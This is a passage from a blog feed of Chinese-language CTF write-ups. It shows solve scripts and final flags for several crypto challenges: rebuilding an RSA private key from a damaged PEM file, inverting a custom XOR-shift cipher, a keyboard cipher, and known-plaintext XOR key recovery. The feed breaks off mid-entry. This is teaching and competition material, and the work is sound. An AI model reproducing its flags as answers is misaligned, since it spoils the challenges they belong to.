class="line">Bc8tSTrvGJm2oYuCzIz+Yg4nwwKBgQDiYUawe5Y+rPbFhVOMVB8ZByfMa4LjeSDdZ23jEGvylBHSeyvFCQq3ISUE40k1D2XmmeaZML3a1nUn6ORIWGaG2phcwrWLkR6nubVmb1QJSzgzmFHGnL56KHByZxD9q6DPB+o6gGWt8/6ddBl2NIZU/1btdPQgojfAXXJFzR92RQKBgQC7qlB0U7m2U4FdG9eelSd+WSKNUVllZAuHji7jgh7Ox6La9xN5miGZ1yvP44yX218OJ9Zi08o6vIrM6Eil45KzTtGm4iuIn8CMpox+5eUtoxyvxa9rs2Wu+IRZN9zCME+p+qI8/TG27dIyDzsdgNqcUo8ESls7uW5/FEA7bYTCiQKBgQC71KybeB+kZ0zlfIdi8tVOpeI+uaHDbdh3+/5wHUsD3hmfg7VAag0q/2RA1vkB/oG1QVLVHl0Yu0I/1/u5jyeakrtClAegAsvlrK+3i321rGS4YpTPb3SX1P/f3GZ7o7DstouA+NHk8IL9T7xkmJYw5h/RLG32ucH6aU6MXfLR5QKBgD/skfdFxGWxhHk6U1mS27IM9jJNg9xLz5nxzkqPPhLn+rdgIIuTuQtv++eEjEP++7ZV10rg5yKVJd/bxy8H2IN7aQo7kZWulHTQDZMFwgOhn0u6glJi+qC8bWzYDFOQSFrY9XQ3vwKMspqm+697xM+dMUW0LML6oUE9ZjEiAY/5</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>密文c：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6081370370545409218106271903400346695565292992689150366474451604281551878507114813906275593034729563149286993189430514737137534129570304832172520820901940874698337733991868650159489601159238582002010625666203730677577976307606665760650563172302688129824842780090723167480409842707790983962415315804311334507726664838464859751689906850572044873633896253285381878416855505301919877714965930289139921111644393144686543207867970807469735534838601255712764863973853116693691206791007433101433703535127367245739289103650669095061417223994665200039533840922696282929063608853551346533188464573323230476645532002621795338655</span><br></pre></td></tr></table></figure><h4 id="解题：">解题：</h4><p>首先对私钥文件恢复</p><p>第一步base64解密 得到的是乱码 转为16进制</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">05cf2d493aef1899b6a18b82cc8cfe620e27c3</span><br><span class="line"></span><br><span class="line">#02整型 长度0x81 推测p</span><br><span class="line">02818100e26146b07b963eacf6c585538c541f190727cc6b82e37920dd676de3106bf29411d27b2bc5090ab7212504e349350f65e699e69930bddad67527e8e448586686da985cc2b58b911ea7b9b5666f54094b38339851c69cbe7a2870726710fdaba0cf07ea3a8065adf3fe9d741976348654ff56ed74f420a237c05d7245cd1f7645</span><br><span class="line"></span><br><span class="line">#02整型 长度0x81 推测q</span><br><span class="line">02818100bbaa507453b9b653815d1bd79e95277e59228d515965640b878e2ee3821ecec7a2daf713799a2199d72bcfe38c97db5f0e27d662d3ca3abc8acce848a5e392b34ed1a6e22b889fc08ca68c7ee5e52da31cafc5af6bb365aef8845937dcc2304fa9faa23cfd31b6edd2320f3b1d80da9c528f044a5b3bb96e7f14403b6d84c289</span><br><span class="line"></span><br><span class="line">#02整型 长度0x81  推测dp</span><br><span class="line">02818100bbd4ac9b781fa4674ce57c8762f2d54ea5e23eb9a1c36dd877fbfe701d4b03de199f83b5406a0d2aff6440d6f901fe81b54152d51e5d18bb423fd7fbb98f279a92bb429407a002cbe5acafb78b7db5ac64b86294cf6f7497d4ffdfdc667ba3b0ecb68b80f8d1e4f082fd4fbc64989630e61fd12c6df6b9c1fa694e8c5df2d1e5</span><br><span class="line"></span><br><span class="line">#02整型  长度128字节  推测dq</span><br><span class="line">0281803fec91f745c465b184793a535992dbb20cf6324d83dc4bcf99f1ce4a8f3e12e7fab760208b93b90b6ffbe7848c43fefbb655d74ae0e7229525dfdbc72f07d8837b690a3b9195ae9474d00d9305c203a19f4bba825262faa0bc6d6cd80c5390485ad8f57437bf028cb29aa6fbaf7bc4cf9d3145b42cc2faa1413d663122018ff9</span><br></pre></td></tr></table></figure><p>上面的结果按照02进行切分 注意不是切所有02！</p><hr><p>关于RSA私钥格式前置知识：参考<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/#RSA%E7%A7%81%E9%92%A5">laz佬博客-rsa</a></p><p>其中整数数据格式举例<code>028180</code></p><p><code>02</code> : 整数的tag</p><p><code>81</code> : 长度类型 后面跟长度 比如128byte</p><p><code>80</code> : 整数占128byte</p><p>后面跟的则是value</p><p>关于私钥格式的顺序：</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240115003333912.png" alt="image-20240115003333912" style="zoom:50%;" /><p>因为我们的破损文件只有后半部分，按照类型形成下面的预测</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240115004918221.png" alt="image-20240115004918221"></p><p>注意取值的时候 去掉tag信息 只保留<code>028181</code>这类信息后面的值</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">6081370370545409218106271903400346695565292992689150366474451604281551878507114813906275593034729563149286993189430514737137534129570304832172520820901940874698337733991868650159489601159238582002010625666203730677577976307606665760650563172302688129824842780090723167480409842707790983962415315804311334507726664838464859751689906850572044873633896253285381878416855505301919877714965930289139921111644393144686543207867970807469735534838601255712764863973853116693691206791007433101433703535127367245739289103650669095061417223994665200039533840922696282929063608853551346533188464573323230476645532002621795338655</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0x00e26146b07b963eacf6c585538c541f190727cc6b82e37920dd676de3106bf29411d27b2bc5090ab7212504e349350f65e699e69930bddad67527e8e448586686da985cc2b58b911ea7b9b5666f54094b38339851c69cbe7a2870726710fdaba0cf07ea3a8065adf3fe9d741976348654ff56ed74f420a237c05d7245cd1f7645</span></span><br><span class="line">q = <span class="number">0x00bbaa507453b9b653815d1bd79e95277e59228d515965640b878e2ee3821ecec7a2daf713799a2199d72bcfe38c97db5f0e27d662d3ca3abc8acce848a5e392b34ed1a6e22b889fc08ca68c7ee5e52da31cafc5af6bb365aef8845937dcc2304fa9faa23cfd31b6edd2320f3b1d80da9c528f044a5b3bb96e7f14403b6d84c289</span></span><br><span class="line">dp = <span class="number">0x00bbd4ac9b781fa4674ce57c8762f2d54ea5e23eb9a1c36dd877fbfe701d4b03de199f83b5406a0d2aff6440d6f901fe81b54152d51e5d18bb423fd7fbb98f279a92bb429407a002cbe5acafb78b7db5ac64b86294cf6f7497d4ffdfdc667ba3b0ecb68b80f8d1e4f082fd4fbc64989630e61fd12c6df6b9c1fa694e8c5df2d1e5</span></span><br><span class="line">dq = <span class="number">0x3fec91f745c465b184793a535992dbb20cf6324d83dc4bcf99f1ce4a8f3e12e7fab760208b93b90b6ffbe7848c43fefbb655d74ae0e7229525dfdbc72f07d8837b690a3b9195ae9474d00d9305c203a19f4bba825262faa0bc6d6cd80c5390485ad8f57437bf028cb29aa6fbaf7bc4cf9d3145b42cc2faa1413d663122018ff9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line"><span class="comment">#m = pow(c, dq, q) 失败 可能信息不全</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;oi!_you_find___what_i_Wa1t_talK_y0n!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-contest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023TUCTF&amp;NBCTF-Crypto&amp;Web</title>
      <link href="/2023/12/06/2023-12-3-TUCTF-NBCTF/"/>
      <url>/2023/12/06/2023-12-3-TUCTF-NBCTF/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="2023-tuctf-nbctf">2023 TUCTF &amp; NBCTF</h1><h1 id="tuctf-crypto">TUCTF-Crypto</h1><p>网址：<a href="https://ctfd.tuctf.com/">https://ctfd.tuctf.com/</a></p><h2 id="custom-ecb-cipher-solved">Custom ECB Cipher | SOLVED</h2><h3 id="题面：">题面：</h3><p>I have designed a simple algorithm which I  believe it’s secure. I am confident you cannot compromise my message  with the x value.</p><h3 id="题目：">题目：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">msg</span>):</span><br><span class="line">    msg = msg ^ msg &gt;&gt; x</span><br><span class="line">    msg = msg ^ msg &lt;&lt; <span class="number">13</span> &amp; <span class="number">275128763</span></span><br><span class="line">    msg = msg ^ msg &lt;&lt; <span class="number">20</span> &amp; <span class="number">2186268085</span></span><br><span class="line">    msg = msg ^ msg &gt;&gt; <span class="number">14</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(message) / <span class="number">4</span>)):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line">c = transform(flag[<span class="number">6</span>:-<span class="number">1</span>]).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = e34a707c5c1970cc6375181577612a4ed07a2c3e3f441d6af808a8acd4310b89bd7e2bb9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="考点：ecb-异或移位算法的逆向">考点：ECB 异或移位算法的逆向</h3><h3 id="解题：">解题：</h3><p>该题的加密逻辑比较清晰，主要通过transform函数进行块加密，每4个字节的数据进行一次加密，进入到convert函数，我们观察convert函数，可以发现，这里的异或和移位操作全部都是可逆的，所以写出一个逆向解密函数</p><p>其中bits代表比特位数，4个字节为一组，一个字节占8bit，所以bits设置为32</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = b&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># right shift inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_right</span>(<span class="params">res, shift, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># right shift with mask inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_right_mask</span>(<span class="params">res, shift, mask, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># left shift inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_left</span>(<span class="params">res, shift, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;test:&quot;</span>,i)</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># left shift with mask inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_left_mask</span>(<span class="params">res, shift, mask, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        <span class="comment"># print(&quot;test:&quot;,i)</span></span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">msg,x</span>):</span><br><span class="line">    msg = msg ^ msg &gt;&gt; x</span><br><span class="line">    msg = msg ^ msg &lt;&lt; <span class="number">13</span> &amp; <span class="number">275128763</span></span><br><span class="line">    msg = msg ^ msg &lt;&lt; <span class="number">20</span> &amp; <span class="number">2186268085</span></span><br><span class="line">    msg = msg ^ msg &gt;&gt; <span class="number">14</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_convert</span>(<span class="params">msg,x</span>):</span><br><span class="line">    msg = inverse_right(msg,<span class="number">14</span>)</span><br><span class="line">    msg = inverse_left_mask(msg,<span class="number">20</span>,<span class="number">2186268085</span>)</span><br><span class="line">    msg = inverse_left_mask(msg,<span class="number">13</span>,<span class="number">275128763</span>)</span><br><span class="line">    msg = inverse_right(msg,x)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_transform</span>(<span class="params">message,x</span>):</span><br><span class="line">    old_message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(message) / <span class="number">4</span>)):</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]  <span class="comment">#先取出4个字节</span></span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        <span class="comment"># print(block.bit_length())</span></span><br><span class="line">        block = inv_convert(block,x)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        old_message += block</span><br><span class="line">    <span class="keyword">return</span> old_message</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;e34a707c5c1970cc6375181577612a4ed07a2c3e3f441d6af808a8acd4310b89bd7e2bb9&#x27;</span></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">bytes</span>.fromhex(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="built_in">print</span>(inv_transform(a,x))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231205150011387.png" alt="image-20231205150011387"></p><p>flag：<code>TUCTF&#123;sRta^s90s-#VgsnzPsta-TjLx7s8Txgs-*Ko&#125;</code></p><h2 id="keyboard-cipher-sovled">Keyboard Cipher | SOVLED</h2><h3 id="题面：">题面：</h3><p>I designed an algorithm to encrypt a  message using my keyboard. No one can decrypt it without any information about my algorithm. Note: Wrap the flag in TUCTF{}.</p><h3 id="题目：">题目：</h3><p>虽然提供了一个enc后缀的文件 但是直接改成txt后缀即可成功打开</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x636a56355279424b615464354946686b566942794e586c4849455279523359674d47394d49486845643045675a316b315569426163304d675a316c715469426163314567616b6c7354534268563252594947745063434178643045675332395149466c6e536d343d</span><br></pre></td></tr></table></figure><h3 id="考点：基础编码转换-键盘密码">考点：基础编码转换 键盘密码</h3><h3 id="解题：">解题：</h3><p>两步转换</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231205155406745.png" alt="image-20231205155406745"></p><p>得到：</p><p><code>r5yG Ji7y XdV r5yG DrGv 0oL xDwA gY5R ZsC gYjN ZsQ jIlM aWdX kOp 1wA KoP YgJn</code></p><p>类似围棋 四个键围在中间的就是flag的值</p><h2 id="table-encryption-solved">Table Encryption | SOLVED</h2><h3 id="题面：">题面：</h3><p>You can’t crack my file! I am the exclusive owner of the encryption key!</p><h3 id="题目：">题目：</h3><p>题目给出了一个文件，其文件名为：<code>table_encryption.xml.enc</code></p><h3 id="考点：-文件解密">考点： 文件解密</h3><h3 id="解题：">解题：</h3><p>其后缀为enc 表明文件进行了加密</p><p>首先分析一下这个enc的加密模式，他是采用了某种加密方式对于文件里面的内容使用一个密钥进行加密，所以我们推测是采用了异或的加密模式，现在可以直接使用python中对于文件进行二进制流进行读取，相当于读取的内容是密文，然后因为文件后缀是xml文件 所以该文件开头部分我们是已知的，相当于明文已知，所以可以对密钥进行恢复</p><p>用010打开文件 获得前段部分的密文</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231205204044679.png" alt="image-20231205204044679"></p><p>数量可以先多一点 然后得到密钥的值后进行微调</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;table_encryption.xml.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()  <span class="comment">#以ascii码读取</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为是xml后缀 也就证明 我们是知道这个加密文件中的部分明文 根据部分已知明文恢复密钥</span></span><br><span class="line">pp = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pp))<span class="comment">#38</span></span><br><span class="line">pm = <span class="string">&#x27;79 52 17 07 05 00 3B 0A 00 1A 07 08 4E 6E 56 50&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pm))<span class="comment">#32  前面的位数不是必须要确定的 而是因为我们推测这个加密的体系 是将文件的内容与给出的密码进行异或</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pm)):</span><br><span class="line">    key += <span class="built_in">chr</span>(<span class="built_in">ord</span>(pp[i])^<span class="built_in">int</span>(pm[i],<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment">#到此我们拿到key = Emoji Moring Sta</span></span><br><span class="line"><span class="comment">#所以将目前加密的文件全部逐个十六进制与Emoji Moring Sta 进行异或 即可实现解密</span></span><br><span class="line"></span><br><span class="line">x = <span class="built_in">open</span>(<span class="string">&#x27;flag.xml&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)):</span><br><span class="line">    x.write(<span class="built_in">chr</span>(f[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)])))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到解密后的文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">&quot;users&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">&quot;posts&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;user_id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">&quot;comments&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;post_id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;user_id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">column</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;varchar&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>John Doe<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">email</span>&gt;</span>john@tuctf.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>TUCTF&#123;x0r_t4bl3s_R_fun!!!11!&#125;<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="bludgeon-the-booty-solved">Bludgeon the Booty | SOLVED</h2><h3 id="题面：">题面：</h3><p>You have found me treasure chest, but can you crack its code?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 